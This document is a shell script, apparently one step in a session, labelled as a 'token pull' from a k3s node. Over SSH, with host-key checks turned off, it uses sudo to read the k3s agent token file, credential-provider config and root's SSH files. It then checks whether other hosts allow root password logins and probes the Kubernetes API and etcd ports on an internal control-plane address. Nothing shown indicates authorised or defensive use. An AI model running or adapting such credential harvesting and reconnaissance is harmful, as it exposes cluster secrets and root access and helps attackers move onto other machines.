echo "=== 221 token pull ==="
cat > /tmp/r7.sh <<'RSH'
#!/bin/bash
echo "=== k3s-agent.service.env ==="
sudo cat /etc/systemd/system/k3s-agent.service.env 2>&1
echo "=== config.yaml.d ==="
sudo cat /etc/rancher/k3s/config.yaml.d/* 2>/dev/null | head -20
echo "=== credential-provider ==="
sudo cat /etc/rancher/k3s/credential-provider-config.yaml 2>/dev/null
echo "=== sshd_pwd_check ==="
sudo cat /root/.ssh/sshd_pwd_check.sh 2>/dev/null
echo "=== root authorized_keys ==="
sudo cat /root/.ssh/authorized_keys 2>/dev/null
echo "=== auth methods probe ==="
for ip in 31 103; do
  echo "-- .79.$ip --"
  ssh -vv -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no root@85.234.79.$ip true 2>&1 | grep -E "Authentications that can continue|Permission denied" | head -3
done
echo "=== listening 6443 on CP probe ==="
curl -sk --max-time 5 https://100.83.208.122:6443/version -w "\nHTTP:%{http_code}\n" | head -c 200
curl -sk --max-time 5 http://100.83.208.122:2379/version -w "\nHTTP:%{http_code}\n" | head -c 200
curl -sk --max-time 5 https://100.83.208.122:9345 -w "\nHTTP:%{http_code}\n" -o /dev/null
RSH
chmod +x /tmp/r7.sh
timeout 110 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/r7.sh 2>&1 | head -60
echo "=== B23DONE ==="
